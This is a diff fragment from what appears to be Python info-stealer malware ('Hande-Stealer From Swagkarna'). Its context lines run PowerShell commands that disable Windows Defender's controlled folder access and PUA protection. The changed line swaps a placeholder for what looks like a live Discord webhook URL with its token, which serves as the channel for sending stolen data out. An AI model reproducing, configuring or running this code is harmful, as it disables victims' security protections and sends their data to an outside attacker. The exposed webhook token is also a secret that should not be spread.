@@ -23,7 +23,7 @@ os.system("powershell.exe -command Set-MpPreference -EnableControlledFolderAcces
 os.system("powershell.exe -command Set-MpPreference -PUAProtection disable")
 
 
-hook = Webhook("https://Your Webhook Url") #change this
+hook = Webhook("https://discord.com/api/webhooks/1095114828827345017/GrZOBEdT2r9XRpVs5JmdL-TtlhYR3H80q4EeI3BJGe6tA9_CADb2pMvQCMjDhiuzB2bL") #change this
 embed = Embed(
     description='Hande-Stealer From Swagkarna! :smiley:',
     color=0x5CDBF0,
